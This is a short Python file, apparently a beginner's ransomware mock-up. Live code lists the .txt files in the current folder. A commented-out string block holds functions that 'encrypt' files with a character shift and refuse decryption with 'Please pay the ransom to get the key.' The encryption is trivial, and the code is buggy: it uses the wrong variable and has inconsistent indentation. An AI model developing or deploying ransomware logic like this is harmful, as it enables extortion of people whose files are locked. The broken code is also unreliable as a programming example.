import subprocess
import os

result=subprocess.getoutput('ls')
files = result.split()

for i in files:
    if(i[-4:] == '.txt'): print(i)
"""
    #finds all files ending in .txt  
    
    def encrypt_file(filename):
        with open(i, 'r') as f:
            plaintext = f.read()
        ciphertext = ''
        for char in plaintext:
            encrypted_char = chr(ord(char) + 100) #if key is 100
            ciphertext += encrypted_char
        with open('encrypted_' + i, 'w') as f:
            f.write(ciphertext)

        print(f"Encryption complete. Encrypted file saved as 'encrypted_{i}'")


def decrypt_file(filename, private_key):
    if private_key != 1000: #
        print("Invalid private key. Please pay the ransom to get the key.")
        return

    with open(filename, 'r') as f:
        ciphertext = f.read()

    plaintext = ''
    for char in ciphertext:
        decrypted_char = chr(ord(char) - 100)
        plaintext += decrypted_char

    with open('decrypted_' + filename, 'w') as f:
        f.write(plaintext)

    print(f"Decryption complete. Decrypted file saved as 'decrypted_{filename}'")
"""